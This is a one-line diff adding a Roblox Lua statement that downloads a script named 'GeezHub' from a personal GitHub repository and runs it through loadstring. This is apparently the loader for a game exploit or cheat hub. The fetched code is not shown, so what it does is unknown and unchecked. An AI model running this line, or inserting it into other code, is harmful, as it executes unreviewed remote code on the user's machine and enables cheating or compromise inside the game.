@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/asdwasx/main/GeezHub"))()
